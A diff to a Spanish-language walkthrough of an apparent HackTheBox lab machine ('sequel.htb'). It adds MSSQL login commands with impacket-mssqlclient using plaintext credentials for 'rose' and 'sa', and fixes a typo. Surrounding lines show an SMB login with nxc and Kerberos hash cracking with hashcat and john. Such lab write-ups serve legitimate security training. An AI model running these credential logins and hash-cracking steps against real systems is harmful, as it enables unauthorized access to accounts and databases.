@@ -112,6 +112,19 @@ nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG'
 
 ## Enumeración MSSQL
 
+Probamos si el usuario `rose` tiene eacceso
+```shell
+impacket-mssqlclient 'sequel.htb/rose:KxEPkKe6R8su@10.129.232.128'
+```
+
+Y también probamos con `sa`
+```shell
+impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@10.129.232.128'
+```
+
+Obteniendo así un acceso a las bases de datos
+
+### Enumeración e las bases de datos
 
 # Explotación
 ## AS-REP Roasting Attack
@@ -165,6 +178,6 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 ```
 
-No son crakeables ya que no obtenemos ninguna password obtenida
+No son crackeables ya que no obtenemos ninguna password obtenida
 
 
